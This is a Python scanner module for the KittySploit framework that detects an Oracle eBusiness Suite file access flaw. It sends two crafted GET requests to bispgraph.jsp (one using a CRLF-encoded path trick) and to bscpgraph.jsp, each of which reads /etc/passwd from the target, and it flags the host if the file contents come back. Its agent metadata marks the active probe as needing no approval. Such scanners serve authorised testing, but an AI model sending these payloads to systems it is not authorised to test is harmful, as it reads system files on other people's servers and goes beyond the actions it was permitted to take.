#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Oracle eBusiness Suite is susceptible to improper file access vulnerabilities via bispgrapgh."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Oracle eBusiness Suite - Improper File Access Detection',
        'description': 'Oracle eBusiness Suite is susceptible to improper file access vulnerabilities via bispgrapgh. Be aware this product is no longer supported with patches or security fixes.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'vulnerability', 'oracle', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite-wp-4.pdf',
            'http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf',
        ],
    }

    def run(self):
        for path in ('/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/', '/OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_regexes = ('root:.*:0:0:',)
            if (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='critical',
                    reason="Oracle eBusiness Suite - Improper File Access detected",
                    path=path,
                )
                return True
        return False

